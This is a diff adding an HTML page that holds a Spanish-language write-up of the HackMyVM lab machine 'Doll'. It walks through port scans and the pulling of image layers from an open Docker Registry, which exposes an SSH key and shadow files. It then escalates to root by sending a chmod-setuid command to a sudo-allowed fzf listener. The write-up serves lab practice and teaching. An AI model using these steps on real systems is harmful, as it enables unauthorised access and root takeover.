@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    
+    <meta property="og:title" content="✍ HackMyVM - Doll " />
+    <meta property="og:description" content="Creador - sML" />
+    
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/doll" />
+    <meta property="og:url" content="https://0x-noname.github.io/writeups/hmv" /> 
+    
+    <meta property="og:image" content="https://0x-noname.github.io/assets/img/hmv_doll/do" />
+    <meta property="og:type" content="website" />
+    <meta charset="UTF-8">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="twitter:image" content="https://0x-noname.github.io/assets/img/hmv_doll/doll_logo.png" />
+    <meta property="twitter:title" content="HackMyVM - Doll" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackMyVm - Doll</title>
+    <link rel="shortcut icon" href="../../assets/img/favicon.ico">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    
+    <link rel="stylesheet" href="../../assets/css/hmv_w.css">  
+</head>
+<body>
+    <header>
+        <nav class="nav">
+            <a href="../../index">$ home</a>
+            <a href="../../hackmyvm">$ hmv</a>
+            <a href="/#">$ whoami</a>
+        </nav>
+    </header>
+    <main class="main">
+        <h1>Pentesting & Ctf Pl4yer</h1>
+        <h2>HackMyVm - Doll</h2>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_hmv">sML</code></p>
+            <img class="img_hmv" src="../../assets/img/hmv_doll/doll_logo.png" alt="doll_logo">
+            <h3>Escaneo de puertos</h3>
+            <pre class="pre">
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.14
+
+PORT     STATE SERVICE
+
+22/tcp   open  ssh
+1007/tcp open  unknown
+</code></pre>
+            <h3>Escaneo de servicios</h3>
+<pre class="pre">
+<code class="code language-txt">❯ nmap -sVC -v -p 22,1007 192.168.1.14 -oN servicios
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 d732ac404ba84166d3d811496ceded4b (RSA)
+|   256 810e67f8c3d2501e4d092a5811c8d495 (ECDSA)
+|_  256 0dc37c540b9d3132f2d909d3eded93cd (ED25519)
+1007/tcp open  http    Docker Registry (API: 2.0)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+                           
+            <p>Después de enumerar directorios con wfuzz navego al directorio<code class="code_negrita">&nbsp;v2&nbsp;</code>para ver su contenido.</p>
+            <img class="img_m" src="../../assets/img/hmv_doll/v2.png" alt="v2">
+
+
+            
+            <p>Como no tengo mucha información he buscado en<code class="code_negrita">&nbsp;Hacktricks&nbsp;</code>y he seguido los pasos para enumerar el servicio de docker.</p>
+<pre class="pre">
+<code class="code language-txt">https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry
+</code></pre>
+
+            <p>Ver lista de repositorios:</p>
+<pre class="pre"><code class="code language-txt">❯ curl -s http://192.168.1.14:1007/v2/_catalog
+{"repositories":["dolly"]}  
+</code></pre>
+
+            <p>Obtener etiquetas de un repositorio.</p>
+<pre class="pre"><code class="code language-txt">❯ curl -s http://192.168.1.14:1007/v2/dolly/tags/list
+{"name":"dolly","tags":["latest"]}    
+</code></pre>
+
+            <p>Obtener los manifiestos.</p>
+<pre class="pre"><code class="code language-txt">❯ curl -s http://192.168.1.14:1007/v2/dolly/manifests/latest
+{
+   "schemaVersion": 1,
+   "name": "dolly",
+   "tag": "latest",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
+      }
+        
+</code></pre>
+
+            <p>Descargar blobs.</p>
+<pre class="pre"><code class="code language-txt">curl -s http://192.168.1.14:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 --output blob1.tar         
+</code></pre>
+
+            <p>Una vez descargados todos los blobs encuentro una llave rsa, pero esta protegida y no se puede romper por fuerza bruta.</p>
+<pre class="pre"><code class="code language-txt">❯ tree -a
+    .
+    ├── etc
+    │   ├── group
+    │   ├── group-
+    │   ├── passwd
+    │   ├── passwd-
+    │   ├── shadow
+    │   └── shadow-
+    ├── home
+    │   └── bela
+    │       ├── .ash_history
+    │       ├── .ssh
+    │       │   └── id_rsa
+</code></pre>
+
+            <p>El passphrase está en los manifiestos de los repositorios.</p>
+            <img class="img_m" src="../../assets/img/hmv_doll/pass.png" alt="pass">
+            <p>Una vez dentro del sistema enumero permisos de sudo.</p>
+<pre class="pre"><code class="code language-txt">bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+                
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+</code></pre>
+            <p>No es necesario pero para mayor comodidad me he conetado con dos terminales, en el primero lanzo fzf.</p>
+<pre class="pre"><code class="code language-txt">bela@doll:~$ sudo /usr/bin/fzf --listen\=1337
+</code></pre>
+
+            <p>Con el segundo terminal obtengo el root.</p>
+<pre class="pre"><code class="code language-txt">bela@doll:~$ curl localhost:1337 -X POST -d "execute(chmod 4755 $(which bash))"
+bela@doll:~$ ls -la /bin/bash                                                                                 
+-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash                                                         
+bela@doll:~$ bash -p
+bash-5.1# uid=1000(bela) gid=1000(bela) euid=0(root)
+</code></pre>
+
+
+            <p>Y con esto ya resolvemos Doll, una curiosa vm made in sML ;) nos vemos!</p>
+
+    </main>
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer bi bi-github"></i></a>
+            <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script>
+
+        </footer>  
+</body>
+</html>
